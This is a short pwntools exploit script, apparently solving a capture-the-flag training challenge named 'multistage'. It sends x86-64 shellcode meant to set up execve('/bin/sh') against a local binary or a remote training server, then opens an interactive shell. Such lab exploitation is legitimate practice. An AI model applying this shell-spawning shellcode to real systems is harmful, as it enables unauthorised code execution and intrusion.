from pwn import *

COMMANDS = """
xuntil 0x40123f
"""
shellcode = b"\x6A\x3B\x58\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F"




#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./multistage" , gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")
p.send(shellcode)
p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

